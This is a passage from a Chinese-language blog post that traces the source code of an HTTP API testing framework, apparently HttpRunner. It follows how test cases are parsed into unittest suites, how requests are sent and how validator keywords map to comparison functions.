report_path</span><br></pre></td></tr></table></figure><p>先来看下具体的执行函数 <code>self._run_suite</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_run_suite</span><span class="params">(self, test_suite)</span>:</span></span><br><span class="line">    tests_results = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> testcase <span class="keyword">in</span> test_suite:</span><br><span class="line">        testcase_name = testcase.config.get(<span class="string">"name"</span>)</span><br><span class="line">        logger.log_info(<span class="string">"Start to run testcase: &#123;&#125;"</span>.format(testcase_name))</span><br><span class="line"></span><br><span class="line">        result = self.unittest_runner.run(testcase)</span><br><span class="line">        tests_results.append((testcase, result))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tests_results</span><br></pre></td></tr></table></figure><p>真正执行用例执行的是 <code>self.unittest_runner</code> ，而 <code>self.unittest_runner = unittest.TextTestRunner(**kwargs)</code>，也就是说这里的 <code>testcase</code> 其实是 <code>unittest.suite.TestSuite</code> 或者 <code>unittest.case.TestCase</code>。</p><p>这里跟预想中的出现了偏差，我以为这里是自己实现的测试执行及结果比对的方法，没想到调用的是 <code>unittest</code>，那么怎么从一个 testcase 变为 <code>unittest</code> 可执行对象的，应该就是在 <code>self._add_tests</code> 中实现的了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_add_tests</span><span class="params">(self, testcases)</span>:</span></span><br><span class="line">    <span class="string">""" initialize testcase with Runner() and add to test suite.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        testcases (list): testcases list.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        unittest.TestSuite()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    """</span></span><br></pre></td></tr></table></figure><p>这个函数略长，这里分开说，从注释中可以知道，最终 unittest 执行的是 <code>unittest.TestSuite</code> ，看下具体的逻辑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">test_suite = unittest.TestSuite() <span class="comment">#定义 test_suite 返回值</span></span><br><span class="line"><span class="keyword">for</span> testcase <span class="keyword">in</span> testcases:</span><br><span class="line">    config = testcase.get(<span class="string">"config"</span>, &#123;&#125;)</span><br><span class="line">    test_runner = runner.Runner(config) <span class="comment"># 实例化 Runner，后续主要执行逻辑都在 Runner 中</span></span><br><span class="line">    TestSequense = type(<span class="string">'TestSequense'</span>, (unittest.TestCase,), &#123;&#125;) <span class="comment"># 通过 type 声明一个 `unittest.TestCase` 的子类</span></span><br><span class="line"></span><br><span class="line">    tests = testcase.get(<span class="string">"teststeps"</span>, [])</span><br><span class="line">    <span class="keyword">for</span> index, test_dict <span class="keyword">in</span> enumerate(tests):</span><br><span class="line">        times = test_dict.get(<span class="string">"times"</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            times = int(times)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">raise</span> exceptions.ParamsError(</span><br><span class="line">                <span class="string">"times should be digit, given: &#123;&#125;"</span>.format(times))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> times_index <span class="keyword">in</span> range(times):</span><br><span class="line">            <span class="comment"># suppose one testcase should not have more than 9999 steps,</span></span><br><span class="line">            <span class="comment"># and one step should not run more than 999 times.</span></span><br><span class="line">            test_method_name = <span class="string">'test_&#123;:04&#125;_&#123;:03&#125;'</span>.format(index, times_index)</span><br><span class="line">            test_method = _add_test(test_runner, test_dict) </span><br><span class="line">            setattr(TestSequense, test_method_name, test_method) <span class="comment"># 将上面的 test_method 定义为 TestSequense 属性</span></span><br><span class="line"></span><br><span class="line">    loaded_testcase = self.test_loader.loadTestsFromTestCase(TestSequense) <span class="comment"># 利用 TestLoader 来找到符合条件的方法，默认 TestLoader 寻找前缀为 `test` </span></span><br><span class="line">    setattr(loaded_testcase, <span class="string">"config"</span>, config)</span><br><span class="line">    setattr(loaded_testcase, <span class="string">"teststeps"</span>, tests)</span><br><span class="line">    setattr(loaded_testcase, <span class="string">"runner"</span>, test_runner)</span><br><span class="line">    test_suite.addTest(loaded_testcase) <span class="comment"># 将 `TestLoader.loadTestsFromTestCase` 找到的 testcase 添加到 `test_suite` 中，并最终返回</span></span><br></pre></td></tr></table></figure><p>看完上面这里，有一个比较重要的就是 <code>_add_test</code> 做了啥：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_add_test</span><span class="params">(test_runner, test_dict)</span>:</span></span><br><span class="line">    <span class="string">""" add test to testcase.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            test_runner.run_test(test_dict)</span><br><span class="line">        <span class="keyword">except</span> exceptions.MyBaseFailure <span class="keyword">as</span> ex:</span><br><span class="line">            self.fail(str(ex))</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            self.meta_datas = test_runner.meta_datas</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> test</span><br></pre></td></tr></table></figure><p>先忽略其他代码，可以看到 <code>_add_test</code> 最终返回的是一个函数，这个函数名称是 <code>test</code> ，结合上面的 <code>self.test_loader.loadTestsFromTestCase</code> ，可以知道这个函数就是最终执行的方法。</p><p>看完这里，回到 <code>run_tests</code> 中，在 <code>self._run_suite</code> 执行完之后，就进行结果汇总、生成报告了，那么具体的请求是怎么发送出去的，结果又是怎么校验的？猜测是在 <code>runner.Runner</code> 中实现的，接着来看。</p><h2 id="用例请求及校验"><a href="#用例请求及校验" class="headerlink" title="用例请求及校验"></a>用例请求及校验</h2><p>在上面提到，最终 <code>_add_test</code> 返回的函数中，执行的内容只有一个，就是 <code>test_runner.run_test</code> ，那么我们来看看 <code>run_test</code> ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_test</span><span class="params">(self, test_dict)</span>:</span></span><br><span class="line">        <span class="string">""" run single teststep of testcase.</span></span><br><span class="line"><span class="string">            test_dict may be in 3 types.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            test_dict (dict):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                # teststep</span></span><br><span class="line"><span class="string">                &#123;</span></span><br><span class="line"><span class="string">                    "name": "teststep description",</span></span><br><span class="line"><span class="string">                    "variables": [],        # optional</span></span><br><span class="line"><span class="string">                    "request": &#123;</span></span><br><span class="line"><span class="string">                        "url": "http://127.0.0.1:5000/api/users/1000",</span></span><br><span class="line"><span class="string">                        "method": "GET"</span></span><br><span class="line"><span class="string">                    &#125;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                # nested testcase</span></span><br><span class="line"><span class="string">                &#123;</span></span><br><span class="line"><span class="string">                    "config": &#123;...&#125;,</span></span><br><span class="line"><span class="string">                    "teststeps": [</span></span><br><span class="line"><span class="string">                        &#123;...&#125;,</span></span><br><span class="line"><span class="string">                        &#123;...&#125;</span></span><br><span class="line"><span class="string">                    ]</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                # TODO: function</span></span><br><span class="line"><span class="string">                &#123;</span></span><br><span class="line"><span class="string">                    "name": "exec function",</span></span><br><span class="line"><span class="string">                    "function": "$&#123;func()&#125;"</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.meta_datas = <span class="keyword">None</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"teststeps"</span> <span class="keyword">in</span> test_dict:</span><br><span class="line">            <span class="comment"># nested testcase</span></span><br><span class="line">            test_dict.setdefault(<span class="string">"config"</span>, &#123;&#125;).setdefault(<span class="string">"variables"</span>, &#123;&#125;)</span><br><span class="line">            test_dict[<span class="string">"config"</span>][<span class="string">"variables"</span>].update(</span><br><span class="line">                self.session_context.session_variables_mapping)</span><br><span class="line">            self._run_testcase(test_dict)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># api</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self._run_test(test_dict)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="comment"># log exception request_type and name for locust stat</span></span><br><span class="line">                self.exception_request_type = test_dict[<span class="string">"request"</span>][<span class="string">"method"</span>]</span><br><span class="line">                self.exception_name = test_dict.get(<span class="string">"name"</span>)</span><br><span class="line">                <span class="keyword">raise</span></span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                self.meta_datas = self.__get_test_data()</span><br></pre></td></tr></table></figure><p>这里的注释虽然很长，但是很清晰的告诉我们这个函数做了什么，他允许传递的参数是嵌套的，所以这里先做了层判断，我们以最简单的来假设，直接看 <code>self._run_test</code> ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_run_test</span><span class="params">(self, test_dict)</span>:</span></span><br><span class="line">        <span class="comment"># clear meta data first to ensure independence for each test</span></span><br><span class="line">        self.__clear_test_data() <span class="comment"># 清空测试结果及 session 信息</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># check skip</span></span><br><span class="line">        self._handle_skip_feature(test_dict) <span class="comment"># 根据测试用例关键字执行相应跳过逻辑</span></span><br><span class="line"></span><br><span class="line">        ... <span class="comment"># N 多准备工作</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># setup hooks</span></span><br><span class="line">        setup_hooks = test_dict.get(<span class="string">"setup_hooks"</span>, [])</span><br><span class="line">        <span class="keyword">if</span> setup_hooks:</span><br><span class="line">            self.do_hook_actions(setup_hooks, <span class="string">"setup"</span>) <span class="comment"># 与大部分框架一样，支持 pre hook</span></span><br><span class="line"></span><br><span class="line">        ... <span class="comment"># N 多准备工作</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># request</span></span><br><span class="line">        resp = self.http_client_session.request( <span class="comment"># 根据用例发出请求</span></span><br><span class="line">            method,</span><br><span class="line">            parsed_url,</span><br><span class="line">            name=(group_name <span class="keyword">or</span> test_name),</span><br><span class="line">            **parsed_test_request</span><br><span class="line">        )</span><br><span class="line">        resp_obj = response.ResponseObject(resp)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># teardown hooks</span></span><br><span class="line">        teardown_hooks = test_dict.get(<span class="string">"teardown_hooks"</span>, []) <span class="comment"># 支持 post hook</span></span><br><span class="line">        <span class="keyword">if</span> teardown_hooks:</span><br><span class="line">            self.session_context.update_test_variables(<span class="string">"response"</span>, resp_obj)</span><br><span class="line">            self.do_hook_actions(teardown_hooks, <span class="string">"teardown"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># extract</span></span><br><span class="line">        extractors = test_dict.get(<span class="string">"extract"</span>, &#123;&#125;)</span><br><span class="line">        extracted_variables_mapping = resp_obj.extract_response(extractors)</span><br><span class="line">        self.session_context.update_session_variables(extracted_variables_mapping)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># validate</span></span><br><span class="line">        validators = test_dict.get(<span class="string">"validate"</span>) <span class="keyword">or</span> test_dict.get(<span class="string">"validators"</span>) <span class="keyword">or</span> []</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.session_context.validate(validators, resp_obj) <span class="comment"># 结果校验</span></span><br><span class="line">        <span class="keyword">except</span> (exceptions.ParamsError, exceptions.ValidationFailure, exceptions.ExtractFailure):</span><br><span class="line">            err_msg = <span class="string">"&#123;&#125; DETAILED REQUEST &amp; RESPONSE &#123;&#125;\n"</span>.format(<span class="string">"*"</span> * <span class="number">32</span>, <span class="string">"*"</span> * <span class="number">32</span>)</span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            self.validation_results = self.session_context.validation_results</span><br></pre></td></tr></table></figure><p>具体的 http 请求时通过 <code>self.http_client_session.request</code> 发送的，通过 <code>self.session_context.validate</code> 进行结果校验，来看下具体的校验方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> validator <span class="keyword">in</span> validators:</span><br><span class="line">    <span class="comment"># validator should be LazyFunction object</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(validator, parser.LazyFunction):</span><br><span class="line">        <span class="keyword">raise</span> exceptions.ValidationFailure(</span><br><span class="line">            <span class="string">"validator should be parsed first: &#123;&#125;"</span>.format(validators))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># evaluate validator args with context variable mapping.</span></span><br><span class="line">    validator_args = validator.get_args()</span><br><span class="line">    check_item, expect_item = validator_args</span><br><span class="line">    check_value = self.__eval_validator_check( <span class="comment"># 准备参数</span></span><br><span class="line">        check_item,</span><br><span class="line">        resp_obj</span><br><span class="line">    )</span><br><span class="line">    expect_value = self.__eval_validator_expect(expect_item) <span class="comment"># 准备参数</span></span><br><span class="line">    validator.update_args([check_value, expect_value])</span><br><span class="line"></span><br><span class="line">    comparator = validator.func_name</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        validator.to_value(self.test_variables_mapping) <span class="comment"># 执行校验</span></span><br><span class="line">        validator_dict[<span class="string">"check_result"</span>] = <span class="string">"pass"</span></span><br><span class="line">        validate_msg += <span class="string">"\t==&gt; pass"</span></span><br><span class="line">        logger.log_debug(validate_msg)</span><br><span class="line">    <span class="keyword">except</span> (AssertionError, TypeError):</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">    self.validation_results.append(validator_dict)</span><br></pre></td></tr></table></figure><p>前面都是在准备参数，最终执行完 <code>validator.to_value</code> 如果没有异常，就直接标记 <code>check_result</code> 为 <code>pass</code> 了，那么我们需要看看这里的 <code>to_value</code> 做了什么，感觉这个方法名称不太好，跟实际做的事情感觉不匹配。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_value</span><span class="params">(self, variables_mapping=None)</span>:</span></span><br><span class="line">    <span class="string">""" parse lazy data with evaluated variables mapping.</span></span><br><span class="line"><span class="string">        Notice: variables_mapping should not contain any variable or function.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    variables_mapping = variables_mapping <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">    args = parse_lazy_data(self._args, variables_mapping)</span><br><span class="line">    kwargs = parse_lazy_data(self._kwargs, variables_mapping)</span><br><span class="line">    self.cache_key = self.__prepare_cache_key(args, kwargs)</span><br><span class="line">    <span class="keyword">return</span> self._func(*args, **kwargs)</span><br></pre></td></tr></table></figure><p>看到这里可能会感觉迷糊下，咦，为什么这里执行了 <code>self._func</code> ，<code>self._func</code> 是什么时候定义的，它做了啥？<br>我们在编写测试用例的时候 <code>validate</code> 通常是<code>eq</code>,<code>gt</code>,<code>lt</code> 等字段，如果把他们直接当作函数执行肯定不行的，那么一定存在一个映射关系将这些关键字转换为对应的函数。</p><p>看到这里其实我们漏掉了一个比较重要的步骤，就是 <code>run_tests</code> 中的 <code>parse_tests</code> 。其实很多时候默认的配置是不足以支撑我们真正逻辑的运行的，往往我们需要根据已有配置来扩充信息，达到满足执行要求的状态，接下来我们来看下测试用例准备工作。</p><h2 id="用例解析"><a href="#用例解析" class="headerlink" title="用例解析"></a>用例解析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_tests</span><span class="params">(tests_mapping)</span>:</span></span><br><span class="line">    </span><br><span class="line">    project_mapping = tests_mapping.get(<span class="string">"project_mapping"</span>, &#123;&#125;)</span><br><span class="line">    testcases = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> test_type <span class="keyword">in</span> tests_mapping:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> test_type == <span class="string">"testsuites"</span>:</span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> test_type == <span class="string">"testcases"</span>:</span><br><span class="line">            <span class="keyword">for</span> testcase <span class="keyword">in</span> tests_mapping[<span class="string">"testcases"</span>]:</span><br><span class="line">                parsed_testcase = _parse_testcase(testcase, project_mapping)</span><br><span class="line">                testcases.append(parsed_testcase)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> test_type == <span class="string">"apis"</span>:</span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> testcases</span><br></pre></td></tr></table></figure><p>这里同样对 <code>test_type</code> 进行了判断，如果不是 <code>testcases</code> ，则会进行处理，我们还是假设最简单的 <code>testcases</code>，可以看到调用了 <code>_parse_testcase</code> 方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_parse_testcase</span><span class="params">(testcase, project_mapping, session_variables_set=None)</span>:</span></span><br><span class="line">    testcase.setdefault(<span class="string">"config"</span>, &#123;&#125;)</span><br><span class="line">    prepared_config = __prepare_config(</span><br><span class="line">        testcase[<span class="string">"config"</span>],</span><br><span class="line">        project_mapping,</span><br><span class="line">        session_variables_set</span><br><span class="line">    )</span><br><span class="line">    prepared_testcase_tests = __prepare_testcase_tests(</span><br><span class="line">        testcase[<span class="string">"teststeps"</span>],</span><br><span class="line">        prepared_config,</span><br><span class="line">        project_mapping,</span><br><span class="line">        session_variables_set</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">"config"</span>: prepared_config,</span><br><span class="line">        <span class="string">"teststeps"</span>: prepared_testcase_tests</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>从官方文档可以知道，每个 testcase 中的 config 其实是全局配置，所以这里先解析了 config，然后将其作为参数传递给了 <code>__prepare_testcase_tests</code> 用来准备对应的 testcase，最终返回准备好的测试用例及配置，那么跟着看下 <code>__prepare_testcase_tests</code>，这个函数很长很长，先忽略其他部分，先来看这段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># unify validators' format</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"validate"</span> <span class="keyword">in</span> test_dict:</span><br><span class="line">    ref_raw_validators = test_dict.pop(<span class="string">"validate"</span>, [])</span><br><span class="line">    test_dict[<span class="string">"validate"</span>] = [</span><br><span class="line">        validator.uniform_validator(_validator)</span><br><span class="line">        <span class="keyword">for</span> _validator <span class="keyword">in</span> ref_raw_validators</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><p>如果存在 <code>validate</code> ，那么将其转换为 <code>validator.uniform_validator</code> 组成的列表，彷佛抓到了什么，我们来看下 <code>validator.uniform_validator</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uniform_validator</span><span class="params">(validator)</span>:</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># uniform comparator, e.g. lt =&gt; less_than, eq =&gt; equals</span></span><br><span class="line">    comparator = get_uniform_comparator(comparator)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">"check"</span>: check_item,</span><br><span class="line">        <span class="string">"expect"</span>: expect_value,</span><br><span class="line">        <span class="string">"comparator"</span>: comparator</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>最终返回的是一个字典，其中的 <code>comparator</code> 是 <code>get_uniform_comparator</code> 返回值，继续看：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_uniform_comparator</span><span class="params">(comparator)</span>:</span></span><br><span class="line">    <span class="string">""" convert comparator alias to uniform name</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> comparator <span class="keyword">in</span> [<span class="string">"eq"</span>, <span class="string">"equals"</span>, <span class="string">"=="</span>, <span class="string">"is"</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"equals"</span></span><br><span class="line">    <span class="keyword">elif</span> comparator <span class="keyword">in</span> [<span class="string">"lt"</span>, <span class="string">"less_than"</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"less_than"</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> comparator</span><br></pre></td></tr></table></figure><p>终于找到了校验关键字的映射关键字，那么我们继续回头看 <code>__prepare_testcase_tests</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># convert validators to lazy function</span></span><br><span class="line">validators = test_dict.pop(<span class="string">"validate"</span>, [])</span><br><span class="line">prepared_validators = []</span><br><span class="line"><span class="keyword">for</span> _validator <span class="keyword">in</span> validators:</span><br><span class="line">    function_meta = &#123;</span><br><span class="line">        <span class="string">"func_name"</span>: _validator[<span class="string">"comparator"</span>],</span><br><span class="line">        <span class="string">"args"</span>: [</span><br><span class="line">            _validator[<span class="string">"check"</span>],</span><br><span class="line">            _validator[<span class="string">"expect"</span>]</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">"kwargs"</span>: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    prepared_validators.append(</span><br><span class="line">        LazyFunction(</span><br><span class="line">            function_meta,</span><br><span class="line">            functions,</span><br><span class="line">            teststep_variables_set</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">test_dict[<span class="string">"validate"</span>] = prepared_validators</span><br><span class="line"></span><br><span class="line"><span class="comment"># convert variables and functions to lazy object.</span></span><br><span class="line"><span class="comment"># raises VariableNotFound if undefined variable exists in test_dict</span></span><br><span class="line">prepared_test_dict = prepare_lazy_data(</span><br><span class="line">    test_dict,</span><br><span class="line">    functions,</span><br><span class="line">    teststep_variables_set</span><br><span class="line">)</span><br><span class="line">prepared_testcase_tests.append(prepared_test_dict)</span><br></pre></td></tr></table></figure><p>在这里针对刚刚得到的关键字对应函数名称又进行了一次封装，现在的 <code>test_dict[&quot;validate&quot;]</code> 就是一个 <code>LazyFunction</code> 组成的列表了，回想最开始我们为啥要看用例解析这部分的代码，因为我们发现在函数校验那里没找到真正执行的函数，我们来看下 <code>LazyFunction</code> 的构造函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 